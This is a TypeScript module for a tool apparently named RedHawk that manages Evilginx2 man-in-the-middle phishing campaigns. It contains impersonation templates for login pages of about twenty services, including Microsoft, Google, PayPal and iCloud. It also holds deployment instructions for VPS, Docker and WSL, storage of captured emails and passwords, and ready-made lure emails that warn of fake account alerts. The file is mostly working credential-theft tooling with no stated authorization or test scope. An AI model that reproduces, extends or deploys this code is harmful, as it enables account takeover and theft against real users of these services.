/**
 * RedHawk — Evilginx2 Phishing Framework Manager
 *
 * Manages Evilginx2 (or similar phishing framework) for phishing campaigns.
 * Evilginx2 is a man-in-the-middle attack framework.
 *
 * On Windows, this requires WSL2 or Docker.
 * - WSL2 path: \\wsl$\Ubuntu\home\<user>\evilginx2\
 * - Docker: docker run -it -p 443:443 -p 80:80 evilginx2/evilginx2
 *
 * For MVP, this provides phishing campaign management, phishlet templates,
 * and credential capture logging — even if the actual proxy runs externally.
 */

import * as path from 'path';
import * as fs from 'fs';
import { exec } from 'child_process';
import { promisify } from 'util';
import { EventEmitter } from 'events';

const asyncExec = promisify(exec);

export interface PhishletTemplate {
  name: string;
  domain: string;
  description: string;
  author: string;
  config: string;
}

export interface PhishingCampaign {
  id: string;
  name: string;
  targetDomain: string;
  phishlet: string;
  landingUrl: string;
  phishingUrl: string;
  status: 'stopped' | 'running' | 'error';
  createdAt: string;
  capturedCredentials: CapturedCredential[];
}

export interface CapturedCredential {
  timestamp: string;
  email: string;
  password: string;
  ip: string;
  userAgent: string;
  url: string;
}

// Bundled phishlet templates
const BUILT_IN_PHISHLETS: PhishletTemplate[] = [
  {
    name: 'microsoft',
    domain: 'login.microsoftonline.com',
    description: 'Microsoft Online / Office 365 login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "microsoft"
author = "RedHawk"

[subdomains]
login = "login.microsoftonline.com"
www = "www.microsoft.com"

[host_replace]
rewrite = "login.microsoftonline.com"
subdomain = "login"

[additional]
redirect_url = "https://login.microsoftonline.com/"
`,
  },
  {
    name: 'google',
    domain: 'accounts.google.com',
    description: 'Google / Gmail login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "google"
author = "RedHawk"

[subdomains]
accounts = "accounts.google.com"

[host_replace]
rewrite = "accounts.google.com"
subdomain = "accounts"

[additional]
redirect_url = "https://myaccount.google.com/"
`,
  },
  {
    name: 'github',
    domain: 'github.com',
    description: 'GitHub login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "github"
author = "RedHawk"

[subdomains]
www = "github.com"

[host_replace]
rewrite = "github.com"
subdomain = "www"
`,
  },
  {
    name: 'linkedin',
    domain: 'linkedin.com',
    description: 'LinkedIn login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "linkedin"
author = "RedHawk"

[subdomains]
www = "www.linkedin.com"

[host_replace]
rewrite = "www.linkedin.com"
subdomain = "www"
`,
  },
  {
    name: 'instagram',
    domain: 'instagram.com',
    description: 'Instagram login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "instagram"
author = "RedHawk"

[subdomains]
www = "www.instagram.com"
api = "api.instagram.com"

[host_replace]
rewrite = "www.instagram.com"
subdomain = "www"
`,
  },
  {
    name: 'discord',
    domain: 'discord.com',
    description: 'Discord login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "discord"
author = "RedHawk"

[subdomains]
discord = "discord.com"
cdn = "cdn.discord.com"

[host_replace]
rewrite = "discord.com"
subdomain = "discord"
`,
  },
  {
    name: 'facebook',
    domain: 'facebook.com',
    description: 'Facebook login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "facebook"
author = "RedHawk"

[subdomains]
www = "www.facebook.com"
m = "m.facebook.com"

[host_replace]
rewrite = "www.facebook.com"
subdomain = "www"
`,
  },
  {
    name: 'twitter',
    domain: 'twitter.com',
    description: 'Twitter / X login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "twitter"
author = "RedHawk"

[subdomains]
twitter = "twitter.com"
x = "x.com"

[host_replace]
rewrite = "twitter.com"
subdomain = "twitter"
`,
  },
  {
    name: 'netflix',
    domain: 'netflix.com',
    description: 'Netflix login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "netflix"
author = "RedHawk"

[subdomains]
www = "www.netflix.com"

[host_replace]
rewrite = "www.netflix.com"
subdomain = "www"
`,
  },
  {
    name: 'icloud',
    domain: 'icloud.com',
    description: 'Apple iCloud login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "icloud"
author = "RedHawk"

[subdomains]
icloud = "icloud.com"

[host_replace]
rewrite = "icloud.com"
subdomain = "icloud"
`,
  },
  {
    name: 'amazon',
    domain: 'amazon.com',
    description: 'Amazon login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "amazon"
author = "RedHawk"

[subdomains]
www = "www.amazon.com"

[host_replace]
rewrite = "www.amazon.com"
subdomain = "www"
`,
  },
  {
    name: 'dropbox',
    domain: 'dropbox.com',
    description: 'Dropbox login / SSO page',
    author: 'RedHawk',
    config: `[phishlet]
name = "dropbox"
author = "RedHawk"

[subdomains]
dropbox = "www.dropbox.com"

[host_replace]
rewrite = "www.dropbox.com"
subdomain = "dropbox"

[additional]
redirect_url = "https://www.dropbox.com/home"
`,
  },
  {
    name: 'adobe',
    domain: 'adobe.com',
    description: 'Adobe ID login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "adobe"
author = "RedHawk"

[subdomains]
adobeid = "auth.services.adobe.com"

[host_replace]
rewrite = "auth.services.adobe.com"
subdomain = "adobeid"
`,
  },
  {
    name: 'outlook',
    domain: 'outlook.live.com',
    description: 'Outlook Web Access login',
    author: 'RedHawk',
    config: `[phishlet]
name = "outlook"
author = "RedHawk"

[subdomains]
outlook = "outlook.live.com"
login = "login.live.com"

[host_replace]
rewrite = "outlook.live.com"
subdomain = "outlook"
`,
  },
  {
    name: 'yahoo',
    domain: 'login.yahoo.com',
    description: 'Yahoo Mail / account login',
    author: 'RedHawk',
    config: `[phishlet]
name = "yahoo"
author = "RedHawk"

[subdomains]
login = "login.yahoo.com"

[host_replace]
rewrite = "login.yahoo.com"
subdomain = "login"
`,
  },
  {
    name: 'whatsapp',
    domain: 'web.whatsapp.com',
    description: 'WhatsApp Web QR / login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "whatsapp"
author = "RedHawk"

[subdomains]
web = "web.whatsapp.com"

[host_replace]
rewrite = "web.whatsapp.com"
subdomain = "web"
`,
  },
  {
    name: 'telegram',
    domain: 'telegram.org',
    description: 'Telegram Web login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "telegram"
author = "RedHawk"

[subdomains]
web = "web.telegram.org"
telegram = "telegram.org"

[host_replace]
rewrite = "web.telegram.org"
subdomain = "web"
`,
  },
  {
    name: 'reddit',
    domain: 'reddit.com',
    description: 'Reddit login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "reddit"
author = "RedHawk"

[subdomains]
reddit = "www.reddit.com"
accounts = "accounts.reddit.com"

[host_replace]
rewrite = "www.reddit.com"
subdomain = "reddit"
`,
  },
  {
    name: 'paypal',
    domain: 'paypal.com',
    description: 'PayPal login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "paypal"
author = "RedHawk"

[subdomains]
paypal = "www.paypal.com"

[host_replace]
rewrite = "www.paypal.com"
subdomain = "paypal"
`,
  },
  {
    name: 'stackoverflow',
    domain: 'stackoverflow.com',
    description: 'Stack Overflow login page',
    author: 'RedHawk',
    config: `[phishlet]
name = "stackoverflow"
author = "RedHawk"

[subdomains]
stackoverflow = "stackoverflow.com"
auth = "stackauth.com"

[host_replace]
rewrite = "stackoverflow.com"
subdomain = "stackoverflow"
`,
  },
];

export class EvilginxManager extends EventEmitter {
  private dataDir: string;
  private campaigns: PhishingCampaign[] = [];
  private evilginxProcess: any = null;

  constructor(userDataPath: string) {
    super();
    this.dataDir = path.join(userDataPath, 'phishing');
    this.ensureDirectories();
    this.loadCampaigns();
  }

  private ensureDirectories() {
    const dirs = [
      this.dataDir,
      path.join(this.dataDir, 'phishlets'),
      path.join(this.dataDir, 'campaigns'),
      path.join(this.dataDir, 'captures'),
    ];
    for (const dir of dirs) {
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
      }
    }
  }

  private loadCampaigns() {
    const campaignsFile = path.join(this.dataDir, 'campaigns.json');
    if (fs.existsSync(campaignsFile)) {
      try {
        const data = fs.readFileSync(campaignsFile, 'utf-8');
        this.campaigns = JSON.parse(data);
      } catch {
        this.campaigns = [];
      }
    }
  }

  private saveCampaigns() {
    const campaignsFile = path.join(this.dataDir, 'campaigns.json');
    fs.writeFileSync(campaignsFile, JSON.stringify(this.campaigns, null, 2));
  }

  // ── Phishlet Templates ──

  getBuiltInPhishlets(): PhishletTemplate[] {
    return BUILT_IN_PHISHLETS;
  }

  getPhishlets(): PhishletTemplate[] {
    const custom: PhishletTemplate[] = [];
    const phishletsDir = path.join(this.dataDir, 'phishlets');
    if (fs.existsSync(phishletsDir)) {
      const files = fs.readdirSync(phishletsDir).filter((f) => f.endsWith('.yaml') || f.endsWith('.txt'));
      for (const file of files) {
        try {
          const content = fs.readFileSync(path.join(phishletsDir, file), 'utf-8');
          custom.push({
            name: file.replace(/\.(yaml|txt)$/, ''),
            domain: '',
            description: 'Custom phishlet',
            author: 'User',
            config: content,
          });
        } catch { /* skip */ }
      }
    }
    return [...BUILT_IN_PHISHLETS, ...custom];
  }

  savePhishlet(name: string, config: string): boolean {
    const filePath = path.join(this.dataDir, 'phishlets', `${name}.txt`);
    try {
      fs.writeFileSync(filePath, config);
      this.emit('phishletSaved', name);
      return true;
    } catch (err) {
      this.emit('error', err);
      return false;
    }
  }

  // ── Campaigns ──

  createCampaign(name: string, targetDomain: string, phishlet: string): PhishingCampaign {
    const campaign: PhishingCampaign = {
      id: `camp_${Date.now()}_${Math.random().toString(36).slice(2, 6)}`,
      name,
      targetDomain,
      phishlet,
      landingUrl: `https://${targetDomain}/`,
      phishingUrl: '',
      status: 'stopped',
      createdAt: new Date().toISOString(),
      capturedCredentials: [],
    };

    this.campaigns.push(campaign);
    this.saveCampaigns();
    return campaign;
  }

  getCampaigns(): PhishingCampaign[] {
    return this.campaigns;
  }

  getCampaign(id: string): PhishingCampaign | undefined {
    return this.campaigns.find((c) => c.id === id);
  }

  // ── Evilginx2 Process ──

  /**
   * Check if evilginx2 is available (in WSL or on PATH)
   */
  async checkAvailability(): Promise<{ available: boolean; path: string; message: string }> {
    // Check WSL first (async — don't block the main process)
    try {
      const { stdout } = await asyncExec('wsl which evilginx2', { timeout: 5000 });
      const wslResult = stdout.trim();
      if (wslResult) {
        return { available: true, path: `wsl:${wslResult}`, message: 'Available in WSL2' };
      }
    } catch { /* not in wsl */ }

    // Check PATH (async)
    try {
      await asyncExec('where evilginx2', { timeout: 5000 });
      return { available: true, path: 'evilginx2', message: 'Available on PATH' };
    } catch { /* not on path */ }

    // Check common install dirs
    const commonPaths = [
      'C:\\tools\\evilginx2\\evilginx2.exe',
      'C:\\Users\\Public\\evilginx2\\evilginx2.exe',
      'C:\\cybersec stuff\\evilginx2\\evilginx2.exe',
    ];
    for (const p of commonPaths) {
      if (fs.existsSync(p)) {
        return { available: true, path: p, message: 'Found at: ' + p };
      }
    }

    return {
      available: false,
      path: '',
      message: 'Evilginx2 not found. Install in WSL2: wsl apt install -y golang && git clone https://github.com/kgretzky/evilginx2 && cd evilginx2 && make',
    };
  }

  /**
   * Start an evilginx2 phishing campaign
   * In MVP, this generates the config and provides instructions
   */
  async startCampaign(campaignId: string, domain: string, ip: string): Promise<{ success: boolean; config: string; instructions: string }> {
    const campaign = this.getCampaign(campaignId);
    if (!campaign) {
      return { success: false, config: '', instructions: 'Campaign not found' };
    }

    // Generate evilginx2 config for this campaign
    const config = this.generateConfig(campaign, domain, ip);
    const configPath = path.join(this.dataDir, 'campaigns', `${campaignId}.ini`);

    try {
      fs.writeFileSync(configPath, config);

      campaign.phishingUrl = `https://${domain}/`;
      campaign.status = 'running';
      this.saveCampaigns();

      const instructions = this.getSetupInstructions(domain, ip);

      return { success: true, config, instructions };
    } catch (err: any) {
      return { success: false, config: '', instructions: `Error: ${err.message}` };
    }
  }

  stopCampaign(campaignId: string): boolean {
    const campaign = this.getCampaign(campaignId);
    if (!campaign) return false;

    campaign.status = 'stopped';
    this.saveCampaigns();
    return true;
  }

  private generateConfig(campaign: PhishingCampaign, domain: string, ip: string): string {
    return `# RedHawk Phishing Campaign
# Campaign: ${campaign.name}
# Target: ${campaign.targetDomain}
# Generated: ${new Date().toISOString()}

[config]
domain = "${domain}"
ip = "${ip}"
phishlet = "${campaign.phishlet}"
redirect_url = "https://${campaign.targetDomain}/"

[phishlet:${campaign.phishlet}]
target_domain = "${campaign.targetDomain}"

# Deploy with:
# evilginx2 -p ${domain} -i ${ip}
`;
  }

  private getSetupInstructions(domain: string, ip: string): string {
    return `
╔══════════════════════════════════════════════════════════╗
║           REDHAWK PHISHING CAMPAIGN SETUP               ║
╚══════════════════════════════════════════════════════════╝

This campaign was configured for evilginx2.

To deploy, you need:

  1. A VPS with port 443 and 80 open
  2. A domain pointing to your server IP: ${ip}
  3. Evilginx2 installed (or use Docker)

=== Option A: Direct Evilginx2 ===

  ssh root@${ip}
  git clone https://github.com/kgretzky/evilginx2
  cd evilginx2
  make
  ./evilginx2 -p ${domain} -i ${ip}

  Inside evilginx2 shell:
    > config domain ${domain}
    > config ip ${ip}
    > phishlets hostname ${domain}
    > phishlets enable ${domain}
    > lures create ${domain}
    > lures get-url 0

=== Option B: Docker ===

  docker run -d \\
    --name evilginx \\
    -p 80:80 -p 443:443 \\
    -v $(pwd)/phishlets:/app/phishlets \\
    -v $(pwd)/data:/app/data \\
    evilginx2/evilginx2

=== Option C: Windows WSL2 ===

  wsl --install -d Ubuntu
  wsl apt update && wsl apt install -y golang git make
  wsl git clone https://github.com/kgretzky/evilginx2
  cd evilginx2 && make
  wsl ./evilginx2

══════════════════════════════════════════════════════════
`;
  }

  // ── Credential Capture Logging ──

  logCapturedCredential(campaignId: string, credential: CapturedCredential) {
    const campaign = this.getCampaign(campaignId);
    if (!campaign) return;

    campaign.capturedCredentials.push(credential);
    this.saveCampaigns();

    // Also save to separate log file
    const logFile = path.join(this.dataDir, 'captures', `${campaignId}.log`);
    const logEntry = JSON.stringify(credential) + '\n';
    fs.appendFileSync(logFile, logEntry);

    this.emit('credentialCaptured', { campaignId, credential });
  }

  getCapturedCredentials(campaignId: string): CapturedCredential[] {
    const campaign = this.getCampaign(campaignId);
    return campaign?.capturedCredentials || [];
  }

  deleteCampaign(campaignId: string): boolean {
    const idx = this.campaigns.findIndex((c) => c.id === campaignId);
    if (idx === -1) return false;

    this.campaigns.splice(idx, 1);
    this.saveCampaigns();

    // Clean up files
    const configPath = path.join(this.dataDir, 'campaigns', `${campaignId}.ini`);
    if (fs.existsSync(configPath)) fs.unlinkSync(configPath);

    return true;
  }

  // ── Quick Phish Template ──

  generatePhishingEmail(campaignName: string, targetDomain: string, phishingUrl: string): string {
    const templates = [
      {
        subject: 'Action Required: Verify Your Account',
        body: `Dear User,

We detected unusual activity on your ${targetDomain} account.
To continue using your account, please verify your credentials immediately.

Verify Now: ${phishingUrl}

This link will expire in 24 hours.

Thank you,
The ${targetDomain} Security Team`,
      },
      {
        subject: 'Security Alert: New Sign-in',
        body: `Hi there,

We noticed a new sign-in to your ${targetDomain} account from an unrecognized device.

If this was you, you can ignore this email.
If not, please secure your account immediately:

${phishingUrl}

Regards,
${targetDomain} Account Security`,
      },
      {
        subject: 'Shared Document: Important Update',
        body: `Hello,

A document has been shared with you regarding your recent activity.

View Document: ${phishingUrl}

This is an automated notification from ${targetDomain}.`,
      },
    ];

    return JSON.stringify(templates, null, 2);
  }
}
